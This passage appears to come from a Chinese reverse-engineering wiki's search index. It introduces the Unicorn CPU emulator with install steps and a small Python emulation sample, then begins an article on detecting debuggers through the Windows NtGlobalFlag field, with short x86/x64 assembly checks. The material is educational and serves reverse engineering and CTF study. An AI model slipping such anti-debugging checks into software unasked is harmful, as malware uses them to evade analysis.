\u6bd4\u5982\u6211\u4eec\u5355\u7eaf\u53ea\u662f\u9700\u8981\u6a21\u62df\u4ee3\u7801\u7684\u6267\u884c\u800c\u975e\u9700\u8981\u4e00\u4e2a\u771f\u7684CPU\u53bb\u5b8c\u6210\u90a3\u4e9b\u64cd\u4f5c, \u53c8\u6216\u8005\u60f3\u8981\u66f4\u5b89\u5168\u5730\u5206\u6790\u6076\u610f\u4ee3\u7801, \u68c0\u6d4b\u75c5\u6bd2\u7279\u5f81, \u6216\u8005\u60f3\u8981\u5728\u9006\u5411\u8fc7\u7a0b\u4e2d\u9a8c\u8bc1\u67d0\u4e9b\u4ee3\u7801\u7684\u542b\u4e49. \u4f7f\u7528CPU\u6a21\u62df\u5668\u53ef\u4ee5\u5f88\u597d\u5730\u5e2e\u52a9\u6211\u4eec\u63d0\u4f9b\u4fbf\u6377.\n\n\n\u5b83\u7684\u4eae\u70b9(\u8fd9\u4e5f\u5f52\u529f\u4e8eUnicorn\u662f\u57fa\u4e8e\nqemu\n\u800c\u5f00\u53d1\u7684)\u6709:\n\n\n\n\n\u652f\u6301\u591a\u79cd\u67b6\u6784: Arm, Arm64 (Armv8), M68K, Mips, Sparc, \n X86 (include X86_64).\n\n\n\u5bf9Windows\u548c\nnix\u7cfb\u7edf(\u5df2\u786e\u8ba4\u5305\u542bMac OSX, Linux, \nBSD \n Solaris)\u7684\u539f\u751f\u652f\u6301\n\n\n\u5177\u6709\u5e73\u53f0\u72ec\u7acb\u4e14\u7b80\u6d01\u6613\u4e8e\u4f7f\u7528\u7684API\n\n\n\u4f7f\u7528JIT\u7f16\u8bd1\u6280\u672f, \u6027\u80fd\u8868\u73b0\u4f18\u5f02\n\n\n\n\n\u4f60\u53ef\u4ee5\u5728\nBlack Hat USA 2015\n\u83b7\u6089\u6709\u5173Unicorn\u5f15\u64ce\u7684\u66f4\u591a\u6280\u672f\u7ec6\u8282. Github\u9879\u76ee\u4e3b\u9875: \nunicorn\n\n\n\u5c3d\u7ba1\u5b83\u4e0d\u540c\u5bfb\u5e38, \u4f46\u5b83\u65e0\u6cd5\u6a21\u62df\u6574\u4e2a\u7a0b\u5e8f\u6216\u7cfb\u7edf, \u4e5f\u4e0d\u652f\u6301\u7cfb\u7edf\u8c03\u7528. \u4f60\u9700\u8981\u624b\u52a8\u6620\u5c04\u5185\u5b58\u5e76\u5199\u5165\u6570\u636e\u8fdb\u53bb, \u968f\u540e\u4f60\u624d\u80fd\u4ece\u6307\u5b9a\u5730\u5740\u5f00\u59cb\u6a21\u62df. \n\n\n\u5e94\u7528\u7684\u60c5\u666f\n\n\n\u4ec0\u4e48\u65f6\u5019\u80fd\u591f\u7528\u5230Unicorn\u5f15\u64ce\u5462? \n\n\n\n\n\u4f60\u53ef\u4ee5\u8c03\u7528\u6076\u610f\u8f6f\u4ef6\u4e2d\u4e00\u4e9b\u6709\u8da3\u7684\u51fd\u6570, \u800c\u4e0d\u7528\u521b\u5efa\u4e00\u4e2a\u6709\u5bb3\u7684\u8fdb\u7a0b.\n\n\n\u7528\u4e8eCTF\u7ade\u8d5b\n\n\n\u7528\u4e8e\u6a21\u7cca\u6d4b\u8bd5\n\n\n\u7528\u4e8egdb\u63d2\u4ef6, \u57fa\u4e8e\u4ee3\u7801\u6a21\u62df\u6267\u884c\u7684\u63d2\u4ef6\n\n\n\u6a21\u62df\u6267\u884c\u4e00\u4e9b\u6df7\u6dc6\u4ee3\u7801\n\n\n\n\n\u5982\u4f55\u5b89\u88c5\n\n\n\u5b89\u88c5Unicorn\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u5c31\u662f\u4f7f\u7528pip\u5b89\u88c5, \u53ea\u8981\u5728\u547d\u4ee4\u884c\u4e2d\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u5373\u53ef(\u8fd9\u662f\u9002\u5408\u4e8e\u559c\u7231\u7528python\u7684\u7528\u6237\u7684\u5b89\u88c5\u65b9\u6cd5, \u5bf9\u4e8e\u90a3\u4e9b\u60f3\u8981\u4f7f\u7528C\u7684\u7528\u6237, \u5219\u9700\u8981\u53bb\u5b98\u7f51\u67e5\u770b\u6587\u6863\u7f16\u8bd1\u6e90\u7801\u5305):\n\n\npip install unicorn\n\n\n\n\n\u4f46\u5982\u679c\u4f60\u60f3\u7528\u6e90\u4ee3\u7801\u8fdb\u884c\u672c\u5730\u7f16\u8bd1\u7684\u8bdd, \u4f60\u9700\u8981\u5728\n\u4e0b\u8f7d\n\u9875\u9762\u4e2d\u4e0b\u8f7d\u6e90\u4ee3\u7801\u5305, \u7136\u540e\u53ef\u4ee5\u6309\u7167\u4ee5\u4e0b\u547d\u4ee4\u6267\u884c:\n\n\n\n\n*nix \u5e73\u53f0\u7528\u6237\n\n\n\n\n$ \ncd\n bindings/python\n$ sudo make install\n\n\n\n\n\n\nWindows\u5e73\u53f0\u7528\u6237\n\n\n\n\ncd\n bindings/python\npython setup.py install\n\n\n\n\n\u5bf9\u4e8eWindows, \u5728\u6267\u884c\u5b8c\u4e0a\u8ff0\u547d\u4ee4\u540e, \u8fd8\u9700\u8981\u5c06\n\u4e0b\u8f7d\n\u9875\u9762\u7684\nWindows core engine\n\u7684\u6240\u6709dll\u6587\u4ef6\u590d\u5236\u5230\nC:\\locationtopython\\Lib\\site-packages\\unicorn\n\u4f4d\u7f6e\u5904. \n\n\n\u4f7f\u7528unicorn\u7684\u5feb\u901f\u6307\u5357\n\n\n\u6211\u4eec\u5c06\u4f1a\u5c55\u793a\u5982\u4f55\u4f7f\u7528python\u8c03\u7528unicorn\u7684api\u4ee5\u53ca\u5b83\u662f\u5982\u4f55\u8f7b\u6613\u5730\u6a21\u62df\u4e8c\u8fdb\u5236\u4ee3\u7801. \u5f53\u7136\u8fd9\u91cc\u7528\u7684api\u4ec5\u662f\u4e00\u5c0f\u90e8\u5206, \u4f46\u5bf9\u4e8e\u5165\u95e8\u5df2\u7ecf\u8db3\u591f\u4e86.\n\n\n \n1\n \nfrom\n \n__future__\n \nimport\n \nprint_function\n\n \n2\n \nfrom\n \nunicorn\n \nimport\n \n*\n\n \n3\n \nfrom\n \nunicorn.x86_const\n \nimport\n \n*\n\n \n4\n \n \n5\n \n# code to be emulated\n\n \n6\n \nX86_CODE32\n \n=\n \nb\n\\x41\\x4a\n \n# INC ecx; DEC edx\n\n \n7\n \n \n8\n \n# memory address where emulation starts\n\n \n9\n \nADDRESS\n \n=\n \n0x1000000\n\n\n10\n \n\n11\n \nprint\n(\nEmulate i386 code\n)\n\n\n12\n \ntry\n:\n\n\n13\n     \n# Initialize emulator in X86-32bit mode\n\n\n14\n     \nmu\n \n=\n \nUc\n(\nUC_ARCH_X86\n,\n \nUC_MODE_32\n)\n\n\n15\n \n\n16\n     \n# map 2MB memory for this emulation\n\n\n17\n     \nmu\n.\nmem_map\n(\nADDRESS\n,\n \n2\n \n*\n \n1024\n \n*\n \n1024\n)\n\n\n18\n \n\n19\n     \n# write machine code to be emulated to memory\n\n\n20\n     \nmu\n.\nmem_write\n(\nADDRESS\n,\n \nX86_CODE32\n)\n\n\n21\n \n\n22\n     \n# initialize machine registers\n\n\n23\n     \nmu\n.\nreg_write\n(\nUC_X86_REG_ECX\n,\n \n0x1234\n)\n\n\n24\n     \nmu\n.\nreg_write\n(\nUC_X86_REG_EDX\n,\n \n0x7890\n)\n\n\n25\n \n\n26\n     \n# emulate code in infinite time \n unlimited instructions\n\n\n27\n     \nmu\n.\nemu_start\n(\nADDRESS\n,\n \nADDRESS\n \n+\n \nlen\n(\nX86_CODE32\n))\n\n\n28\n \n\n29\n     \n# now print out some registers\n\n\n30\n     \nprint\n(\nEmulation done. Below is the CPU context\n)\n\n\n31\n \n\n32\n     \nr_ecx\n \n=\n \nmu\n.\nreg_read\n(\nUC_X86_REG_ECX\n)\n\n\n33\n     \nr_edx\n \n=\n \nmu\n.\nreg_read\n(\nUC_X86_REG_EDX\n)\n\n\n34\n     \nprint\n(\n ECX = 0x\n%x\n \n%\nr_ecx\n)\n\n\n35\n     \nprint\n(\n EDX = 0x\n%x\n \n%\nr_edx\n)\n\n\n36\n \n\n37\n \nexcept\n \nUcError\n \nas\n \ne\n:\n\n\n38\n     \nprint\n(\nERROR: \n%s\n \n%\n \ne\n)\n\n\n\n\n\n\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b:\n\n\n$ python test1.py \nEmulate i386 code\nEmulation \ndone\n. Below is the CPU context\n\n \nECX\n \n=\n 0x1235\n\n \nEDX\n \n=\n 0x788f\n\n\n\n\n\u6837\u4f8b\u91cc\u7684\u6ce8\u91ca\u5df2\u7ecf\u975e\u5e38\u76f4\u89c2, \u4f46\u6211\u4eec\u8fd8\u662f\u5bf9\u6bcf\u4e00\u884c\u4ee3\u7801\u505a\u51fa\u89e3\u91ca:\n\n \u884c\u53f72~3: \u5728\u4f7f\u7528Unicorn\u524d\u5bfc\u5165\nunicorn\n\u6a21\u5757. \u6837\u4f8b\u4e2d\u4f7f\u7528\u4e86\u4e00\u4e9bx86\u5bc4\u5b58\u5668\u5e38\u91cf, \u6240\u4ee5\u4e5f\u9700\u8981\u5bfc\u5165\nunicorn.x86_const\n\u6a21\u5757\n\n \u884c\u53f76: \u8fd9\u662f\u6211\u4eec\u9700\u8981\u6a21\u62df\u7684\u4e8c\u8fdb\u5236\u673a\u5668\u7801, \u4f7f\u7528\u5341\u516d\u8fdb\u5236\u8868\u793a, \u4ee3\u8868\u7684\u6c47\u7f16\u6307\u4ee4\u662f: \"INC ecx\" \u548c \"DEC edx\".\n\n \u884c\u53f79: \u6211\u4eec\u5c06\u6a21\u62df\u6267\u884c\u4e0a\u8ff0\u6307\u4ee4\u7684\u6240\u5728\u865a\u62df\u5730\u5740\n\n \u884c\u53f714: \u4f7f\u7528\nUc\n\u7c7b\u521d\u59cb\u5316Unicorn, \u8be5\u7c7b\u63a5\u53d72\u4e2a\u53c2\u6570: \u786c\u4ef6\u67b6\u6784\u548c\u786c\u4ef6\u4f4d\u6570(\u6a21\u5f0f). \u5728\u6837\u4f8b\u4e2d\u6211\u4eec\u9700\u8981\u6a21\u62df\u6267\u884cx86\u67b6\u6784\u768432\u4f4d\u4ee3\u7801, \u6211\u4eec\u4f7f\u7528\u53d8\u91cf\nmu\n\u6765\u63a5\u53d7\u8fd4\u56de\u503c.\n\n \u884c\u53f717: \u4f7f\u7528\nmem_map\n\u65b9\u6cd5\u6839\u636e\u5728\u884c\u53f79\u5904\u58f0\u660e\u7684\u5730\u5740, \u6620\u5c042MB\u7528\u4e8e\u6a21\u62df\u6267\u884c\u7684\u5185\u5b58\u7a7a\u95f4. \u6240\u6709\u8fdb\u7a0b\u4e2d\u7684CPU\u64cd\u4f5c\u90fd\u5e94\u8be5\u53ea\u8bbf\u95ee\u8be5\u5185\u5b58\u533a\u57df. \u6620\u5c04\u7684\u5185\u5b58\u5177\u6709\u9ed8\u8ba4\u7684\u8bfb,\u5199\u548c\u6267\u884c\u6743\u9650.\n\n \u884c\u53f720: \u5c06\u9700\u8981\u6a21\u62df\u6267\u884c\u7684\u4ee3\u7801\u5199\u5165\u6211\u4eec\u521a\u521a\u6620\u5c04\u7684\u5185\u5b58\u4e2d. \nmem_write\n\u65b9\u6cd5\u63a5\u53d72\u4e2a\u53c2\u6570: \u8981\u5199\u5165\u7684\u5185\u5b58\u5730\u5740\u548c\u9700\u8981\u5199\u5165\u5185\u5b58\u7684\u4ee3\u7801.\n\n \u884c\u53f723~24: \u4f7f\u7528\nreg_write\n\u65b9\u6cd5\u8bbe\u7f6e\nECX\n\u548c\nEDX\n\u5bc4\u5b58\u5668\u7684\u503c\n\n \u884c\u53f727: \u4f7f\u7528\nemu_start\n\u65b9\u6cd5\u5f00\u59cb\u6a21\u62df\u6267\u884c, \u8be5API\u63a5\u53d74\u4e2a\u53c2\u6570: \u8981\u6a21\u62df\u6267\u884c\u7684\u4ee3\u7801\u5730\u5740, \u6a21\u62df\u6267\u884c\u505c\u6b62\u7684\u5185\u5b58\u5730\u5740(\u8fd9\u91cc\u662f\nX86_CODE32\n\u7684\u6700\u540e1\u5b57\u8282\u5904), \u6a21\u62df\u6267\u884c\u7684\u65f6\u95f4\u548c\u9700\u8981\u6267\u884c\u7684\u6307\u4ee4\u6570\u76ee. \u5982\u679c\u6211\u4eec\u50cf\u6837\u4f8b\u4e00\u6837\u5ffd\u7565\u540e\u4e24\u4e2a\u53c2\u6570, Unicorn\u5c06\u4f1a\u9ed8\u8ba4\u4ee5\u65e0\u7a77\u65f6\u95f4\u548c\u65e0\u7a77\u6307\u4ee4\u6570\u76ee\u7684\u6761\u4ef6\u6765\u6a21\u62df\u6267\u884c\u4ee3\u7801. \n* \u884c\u53f732~35: \u6253\u5370\u8f93\u51fa\nECX\n\u548c\nEDX\n\u5bc4\u5b58\u5668\u7684\u503c. \u6211\u4eec\u4f7f\u7528\u51fd\u6570\nreg_read\n\u6765\u8bfb\u53d6\u5bc4\u5b58\u5668\u7684\u503c.\n\n\n\u8981\u60f3\u67e5\u770b\u66f4\u591a\u7684python\u793a\u4f8b, \u53ef\u4ee5\u67e5\u770b\u6587\u4ef6\u5939\nbindings/python\n\u4e0b\u7684\u4ee3\u7801. \u800cC\u7684\u793a\u4f8b\u5219\u53ef\u4ee5\u67e5\u770b\nsample\n\u6587\u4ef6\u5939\u4e0b\u7684\u4ee3\u7801. \n\n\n\u53c2\u8003\u94fe\u63a5\n\n\n\n\nUnicorn Official Site\n\n\nQuick tutorial on programming with Unicorn - with C \n Python.", 
            "title": "Unicorn Engine \u7b80\u4ecb"
        }, 
        {
            "location": "/reverse/unicorn/introduction/#unicorn-engine", 
            "text": "", 
            "title": "Unicorn Engine\u7b80\u4ecb"
        }, 
        {
            "location": "/reverse/unicorn/introduction/#unicorn", 
            "text": "Unicorn\u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7, \u591a\u5e73\u53f0, \u591a\u67b6\u6784\u7684CPU\u6a21\u62df\u5668\u6846\u67b6. \u6211\u4eec\u53ef\u4ee5\u66f4\u597d\u5730\u5173\u6ce8CPU\u64cd\u4f5c, \u5ffd\u7565\u673a\u5668\u8bbe\u5907\u7684\u5dee\u5f02. \u60f3\u8c61\u4e00\u4e0b, \u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u5e94\u7528\u4e8e\u8fd9\u4e9b\u60c5\u666f: \u6bd4\u5982\u6211\u4eec\u5355\u7eaf\u53ea\u662f\u9700\u8981\u6a21\u62df\u4ee3\u7801\u7684\u6267\u884c\u800c\u975e\u9700\u8981\u4e00\u4e2a\u771f\u7684CPU\u53bb\u5b8c\u6210\u90a3\u4e9b\u64cd\u4f5c, \u53c8\u6216\u8005\u60f3\u8981\u66f4\u5b89\u5168\u5730\u5206\u6790\u6076\u610f\u4ee3\u7801, \u68c0\u6d4b\u75c5\u6bd2\u7279\u5f81, \u6216\u8005\u60f3\u8981\u5728\u9006\u5411\u8fc7\u7a0b\u4e2d\u9a8c\u8bc1\u67d0\u4e9b\u4ee3\u7801\u7684\u542b\u4e49. \u4f7f\u7528CPU\u6a21\u62df\u5668\u53ef\u4ee5\u5f88\u597d\u5730\u5e2e\u52a9\u6211\u4eec\u63d0\u4f9b\u4fbf\u6377.  \u5b83\u7684\u4eae\u70b9(\u8fd9\u4e5f\u5f52\u529f\u4e8eUnicorn\u662f\u57fa\u4e8e qemu \u800c\u5f00\u53d1\u7684)\u6709:   \u652f\u6301\u591a\u79cd\u67b6\u6784: Arm, Arm64 (Armv8), M68K, Mips, Sparc,   X86 (include X86_64).  \u5bf9Windows\u548c nix\u7cfb\u7edf(\u5df2\u786e\u8ba4\u5305\u542bMac OSX, Linux,  BSD   Solaris)\u7684\u539f\u751f\u652f\u6301  \u5177\u6709\u5e73\u53f0\u72ec\u7acb\u4e14\u7b80\u6d01\u6613\u4e8e\u4f7f\u7528\u7684API  \u4f7f\u7528JIT\u7f16\u8bd1\u6280\u672f, \u6027\u80fd\u8868\u73b0\u4f18\u5f02   \u4f60\u53ef\u4ee5\u5728 Black Hat USA 2015 \u83b7\u6089\u6709\u5173Unicorn\u5f15\u64ce\u7684\u66f4\u591a\u6280\u672f\u7ec6\u8282. Github\u9879\u76ee\u4e3b\u9875:  unicorn  \u5c3d\u7ba1\u5b83\u4e0d\u540c\u5bfb\u5e38, \u4f46\u5b83\u65e0\u6cd5\u6a21\u62df\u6574\u4e2a\u7a0b\u5e8f\u6216\u7cfb\u7edf, \u4e5f\u4e0d\u652f\u6301\u7cfb\u7edf\u8c03\u7528. \u4f60\u9700\u8981\u624b\u52a8\u6620\u5c04\u5185\u5b58\u5e76\u5199\u5165\u6570\u636e\u8fdb\u53bb, \u968f\u540e\u4f60\u624d\u80fd\u4ece\u6307\u5b9a\u5730\u5740\u5f00\u59cb\u6a21\u62df.", 
            "title": "\u4ec0\u4e48\u662fUnicorn\u5f15\u64ce"
        }, 
        {
            "location": "/reverse/unicorn/introduction/#_1", 
            "text": "\u4ec0\u4e48\u65f6\u5019\u80fd\u591f\u7528\u5230Unicorn\u5f15\u64ce\u5462?    \u4f60\u53ef\u4ee5\u8c03\u7528\u6076\u610f\u8f6f\u4ef6\u4e2d\u4e00\u4e9b\u6709\u8da3\u7684\u51fd\u6570, \u800c\u4e0d\u7528\u521b\u5efa\u4e00\u4e2a\u6709\u5bb3\u7684\u8fdb\u7a0b.  \u7528\u4e8eCTF\u7ade\u8d5b  \u7528\u4e8e\u6a21\u7cca\u6d4b\u8bd5  \u7528\u4e8egdb\u63d2\u4ef6, \u57fa\u4e8e\u4ee3\u7801\u6a21\u62df\u6267\u884c\u7684\u63d2\u4ef6  \u6a21\u62df\u6267\u884c\u4e00\u4e9b\u6df7\u6dc6\u4ee3\u7801", 
            "title": "\u5e94\u7528\u7684\u60c5\u666f"
        }, 
        {
            "location": "/reverse/unicorn/introduction/#_2", 
            "text": "\u5b89\u88c5Unicorn\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u5c31\u662f\u4f7f\u7528pip\u5b89\u88c5, \u53ea\u8981\u5728\u547d\u4ee4\u884c\u4e2d\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u5373\u53ef(\u8fd9\u662f\u9002\u5408\u4e8e\u559c\u7231\u7528python\u7684\u7528\u6237\u7684\u5b89\u88c5\u65b9\u6cd5, \u5bf9\u4e8e\u90a3\u4e9b\u60f3\u8981\u4f7f\u7528C\u7684\u7528\u6237, \u5219\u9700\u8981\u53bb\u5b98\u7f51\u67e5\u770b\u6587\u6863\u7f16\u8bd1\u6e90\u7801\u5305):  pip install unicorn  \u4f46\u5982\u679c\u4f60\u60f3\u7528\u6e90\u4ee3\u7801\u8fdb\u884c\u672c\u5730\u7f16\u8bd1\u7684\u8bdd, \u4f60\u9700\u8981\u5728 \u4e0b\u8f7d \u9875\u9762\u4e2d\u4e0b\u8f7d\u6e90\u4ee3\u7801\u5305, \u7136\u540e\u53ef\u4ee5\u6309\u7167\u4ee5\u4e0b\u547d\u4ee4\u6267\u884c:   *nix \u5e73\u53f0\u7528\u6237   $  cd  bindings/python\n$ sudo make install   Windows\u5e73\u53f0\u7528\u6237   cd  bindings/python\npython setup.py install  \u5bf9\u4e8eWindows, \u5728\u6267\u884c\u5b8c\u4e0a\u8ff0\u547d\u4ee4\u540e, \u8fd8\u9700\u8981\u5c06 \u4e0b\u8f7d \u9875\u9762\u7684 Windows core engine \u7684\u6240\u6709dll\u6587\u4ef6\u590d\u5236\u5230 C:\\locationtopython\\Lib\\site-packages\\unicorn \u4f4d\u7f6e\u5904.", 
            "title": "\u5982\u4f55\u5b89\u88c5"
        }, 
        {
            "location": "/reverse/unicorn/introduction/#unicorn_1", 
            "text": "\u6211\u4eec\u5c06\u4f1a\u5c55\u793a\u5982\u4f55\u4f7f\u7528python\u8c03\u7528unicorn\u7684api\u4ee5\u53ca\u5b83\u662f\u5982\u4f55\u8f7b\u6613\u5730\u6a21\u62df\u4e8c\u8fdb\u5236\u4ee3\u7801. \u5f53\u7136\u8fd9\u91cc\u7528\u7684api\u4ec5\u662f\u4e00\u5c0f\u90e8\u5206, \u4f46\u5bf9\u4e8e\u5165\u95e8\u5df2\u7ecf\u8db3\u591f\u4e86.    1   from   __future__   import   print_function \n  2   from   unicorn   import   * \n  3   from   unicorn.x86_const   import   * \n  4  \n  5   # code to be emulated \n  6   X86_CODE32   =   b \\x41\\x4a   # INC ecx; DEC edx \n  7  \n  8   # memory address where emulation starts \n  9   ADDRESS   =   0x1000000  10   11   print ( Emulate i386 code )  12   try :  13       # Initialize emulator in X86-32bit mode  14       mu   =   Uc ( UC_ARCH_X86 ,   UC_MODE_32 )  15   16       # map 2MB memory for this emulation  17       mu . mem_map ( ADDRESS ,   2   *   1024   *   1024 )  18   19       # write machine code to be emulated to memory  20       mu . mem_write ( ADDRESS ,   X86_CODE32 )  21   22       # initialize machine registers  23       mu . reg_write ( UC_X86_REG_ECX ,   0x1234 )  24       mu . reg_write ( UC_X86_REG_EDX ,   0x7890 )  25   26       # emulate code in infinite time   unlimited instructions  27       mu . emu_start ( ADDRESS ,   ADDRESS   +   len ( X86_CODE32 ))  28   29       # now print out some registers  30       print ( Emulation done. Below is the CPU context )  31   32       r_ecx   =   mu . reg_read ( UC_X86_REG_ECX )  33       r_edx   =   mu . reg_read ( UC_X86_REG_EDX )  34       print (  ECX = 0x %x   % r_ecx )  35       print (  EDX = 0x %x   % r_edx )  36   37   except   UcError   as   e :  38       print ( ERROR:  %s   %   e )   \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b:  $ python test1.py \nEmulate i386 code\nEmulation  done . Below is the CPU context   ECX   =  0x1235   EDX   =  0x788f  \u6837\u4f8b\u91cc\u7684\u6ce8\u91ca\u5df2\u7ecf\u975e\u5e38\u76f4\u89c2, \u4f46\u6211\u4eec\u8fd8\u662f\u5bf9\u6bcf\u4e00\u884c\u4ee3\u7801\u505a\u51fa\u89e3\u91ca:  \u884c\u53f72~3: \u5728\u4f7f\u7528Unicorn\u524d\u5bfc\u5165 unicorn \u6a21\u5757. \u6837\u4f8b\u4e2d\u4f7f\u7528\u4e86\u4e00\u4e9bx86\u5bc4\u5b58\u5668\u5e38\u91cf, \u6240\u4ee5\u4e5f\u9700\u8981\u5bfc\u5165 unicorn.x86_const \u6a21\u5757  \u884c\u53f76: \u8fd9\u662f\u6211\u4eec\u9700\u8981\u6a21\u62df\u7684\u4e8c\u8fdb\u5236\u673a\u5668\u7801, \u4f7f\u7528\u5341\u516d\u8fdb\u5236\u8868\u793a, \u4ee3\u8868\u7684\u6c47\u7f16\u6307\u4ee4\u662f: \"INC ecx\" \u548c \"DEC edx\".  \u884c\u53f79: \u6211\u4eec\u5c06\u6a21\u62df\u6267\u884c\u4e0a\u8ff0\u6307\u4ee4\u7684\u6240\u5728\u865a\u62df\u5730\u5740  \u884c\u53f714: \u4f7f\u7528 Uc \u7c7b\u521d\u59cb\u5316Unicorn, \u8be5\u7c7b\u63a5\u53d72\u4e2a\u53c2\u6570: \u786c\u4ef6\u67b6\u6784\u548c\u786c\u4ef6\u4f4d\u6570(\u6a21\u5f0f). \u5728\u6837\u4f8b\u4e2d\u6211\u4eec\u9700\u8981\u6a21\u62df\u6267\u884cx86\u67b6\u6784\u768432\u4f4d\u4ee3\u7801, \u6211\u4eec\u4f7f\u7528\u53d8\u91cf mu \u6765\u63a5\u53d7\u8fd4\u56de\u503c.  \u884c\u53f717: \u4f7f\u7528 mem_map \u65b9\u6cd5\u6839\u636e\u5728\u884c\u53f79\u5904\u58f0\u660e\u7684\u5730\u5740, \u6620\u5c042MB\u7528\u4e8e\u6a21\u62df\u6267\u884c\u7684\u5185\u5b58\u7a7a\u95f4. \u6240\u6709\u8fdb\u7a0b\u4e2d\u7684CPU\u64cd\u4f5c\u90fd\u5e94\u8be5\u53ea\u8bbf\u95ee\u8be5\u5185\u5b58\u533a\u57df. \u6620\u5c04\u7684\u5185\u5b58\u5177\u6709\u9ed8\u8ba4\u7684\u8bfb,\u5199\u548c\u6267\u884c\u6743\u9650.  \u884c\u53f720: \u5c06\u9700\u8981\u6a21\u62df\u6267\u884c\u7684\u4ee3\u7801\u5199\u5165\u6211\u4eec\u521a\u521a\u6620\u5c04\u7684\u5185\u5b58\u4e2d.  mem_write \u65b9\u6cd5\u63a5\u53d72\u4e2a\u53c2\u6570: \u8981\u5199\u5165\u7684\u5185\u5b58\u5730\u5740\u548c\u9700\u8981\u5199\u5165\u5185\u5b58\u7684\u4ee3\u7801.  \u884c\u53f723~24: \u4f7f\u7528 reg_write \u65b9\u6cd5\u8bbe\u7f6e ECX \u548c EDX \u5bc4\u5b58\u5668\u7684\u503c  \u884c\u53f727: \u4f7f\u7528 emu_start \u65b9\u6cd5\u5f00\u59cb\u6a21\u62df\u6267\u884c, \u8be5API\u63a5\u53d74\u4e2a\u53c2\u6570: \u8981\u6a21\u62df\u6267\u884c\u7684\u4ee3\u7801\u5730\u5740, \u6a21\u62df\u6267\u884c\u505c\u6b62\u7684\u5185\u5b58\u5730\u5740(\u8fd9\u91cc\u662f X86_CODE32 \u7684\u6700\u540e1\u5b57\u8282\u5904), \u6a21\u62df\u6267\u884c\u7684\u65f6\u95f4\u548c\u9700\u8981\u6267\u884c\u7684\u6307\u4ee4\u6570\u76ee. \u5982\u679c\u6211\u4eec\u50cf\u6837\u4f8b\u4e00\u6837\u5ffd\u7565\u540e\u4e24\u4e2a\u53c2\u6570, Unicorn\u5c06\u4f1a\u9ed8\u8ba4\u4ee5\u65e0\u7a77\u65f6\u95f4\u548c\u65e0\u7a77\u6307\u4ee4\u6570\u76ee\u7684\u6761\u4ef6\u6765\u6a21\u62df\u6267\u884c\u4ee3\u7801. \n* \u884c\u53f732~35: \u6253\u5370\u8f93\u51fa ECX \u548c EDX \u5bc4\u5b58\u5668\u7684\u503c. \u6211\u4eec\u4f7f\u7528\u51fd\u6570 reg_read \u6765\u8bfb\u53d6\u5bc4\u5b58\u5668\u7684\u503c.  \u8981\u60f3\u67e5\u770b\u66f4\u591a\u7684python\u793a\u4f8b, \u53ef\u4ee5\u67e5\u770b\u6587\u4ef6\u5939 bindings/python \u4e0b\u7684\u4ee3\u7801. \u800cC\u7684\u793a\u4f8b\u5219\u53ef\u4ee5\u67e5\u770b sample \u6587\u4ef6\u5939\u4e0b\u7684\u4ee3\u7801.", 
            "title": "\u4f7f\u7528unicorn\u7684\u5feb\u901f\u6307\u5357"
        }, 
        {
            "location": "/reverse/unicorn/introduction/#_3", 
            "text": "Unicorn Official Site  Quick tutorial on programming with Unicorn - with C   Python.", 
            "title": "\u53c2\u8003\u94fe\u63a5"
        }, 
        {
            "location": "/reverse/anti-debug/ntglobalflag/", 
            "text": "\u5173\u4e8eNtGlobalFlag\n\n\n\u572832\u4f4d\u673a\u5668\u4e0a, \nNtGlobalFlag\n\u5b57\u6bb5\u4f4d\u4e8e\nPEB\n(\u8fdb\u7a0b\u73af\u5883\u5757)\n0x68\n\u7684\u504f\u79fb\u5904, 64\u4f4d\u673a\u5668\u5219\u662f\u5728\u504f\u79fb\n0xBC\n\u4f4d\u7f6e. \u8be5\u5b57\u6bb5\u7684\u9ed8\u8ba4\u503c\u4e3a0. \u5f53\u8c03\u8bd5\u5668\u6b63\u5728\u8fd0\u884c\u65f6, \u8be5\u5b57\u6bb5\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u7279\u5b9a\u7684\u503c. \u5c3d\u7ba1\u8be5\u503c\u5e76\u4e0d\u80fd\u5341\u5206\u53ef\u4fe1\u5730\u8868\u660e\u67d0\u4e2a\u8c03\u8bd5\u5668\u771f\u7684\u6709\u5728\u8fd0\u884c, \u4f46\u8be5\u5b57\u6bb5\u5e38\u51fa\u4e8e\u8be5\u76ee\u7684\u800c\u88ab\u4f7f\u7528. \n\n\n\u8be5\u5b57\u6bb5\u5305\u542b\u6709\u4e00\u7cfb\u5217\u7684\u6807\u5fd7\u4f4d. \u7531\u8c03\u8bd5\u5668\u521b\u5efa\u7684\u8fdb\u7a0b\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7\u4f4d:\n\n\nFLG_HEAP_ENABLE_TAIL_CHECK\n \n(\n0x10\n)\n\n\nFLG_HEAP_ENABLE_FREE_CHECK\n \n(\n0x20\n)\n\n\nFLG_HEAP_VALIDATE_PARAMETERS\n \n(\n0x40\n)\n\n\n\n\n\n\u68c0\u6d4b\u4ee3\u7801\n\n\n\u56e0\u6b64, \u53ef\u4ee5\u68c0\u67e5\u8fd9\u51e0\u4e2a\u6807\u5fd7\u4f4d\u6765\u68c0\u6d4b\u8c03\u8bd5\u5668\u662f\u5426\u5b58\u5728. \u6bd4\u5982\u7528\u5f62\u5982\u4ee5\u4e0b\u768432\u4f4d\u7684\u4ee3\u7801\u572832\u4f4d\u673a\u5668\u4e0a\u8fdb\u884c\u68c0\u6d4b:\n\n\nmov\n \neax\n,\n \nfs\n:[\n30\nh\n]\n \n;Process Environment Block\n\n\nmov\n \nal\n,\n \n[\neax\n+\n68\nh\n]\n \n;NtGlobalFlag\n\n\nand\n \nal\n,\n \n70\nh\n\n\ncmp\n \nal\n,\n \n70\nh\n\n\nje\n \nbeing_debugged\n\n\n\n\n\n\u4ee5\u4e0b\u662f64\u4f4d\u7684\u4ee3\u7801\u572864\u4f4d\u673a\u5668\u4e0a\u7684\u68c0\u6d4b\u4ee3\u7801:\n\n\npush\n \n60\nh\n\n\npop\n \nrsi\n\n\ngs:\nlodsq\n                \n;Process Environment Block\n\n\nmov\n \nal\n,\n \n[\nrsi\n*\n2\n+\nrax-14h\n]\n \n;NtGlobalFlag\n\n\nand\n \nal\n,\n \n70\nh\n\n\ncmp\n 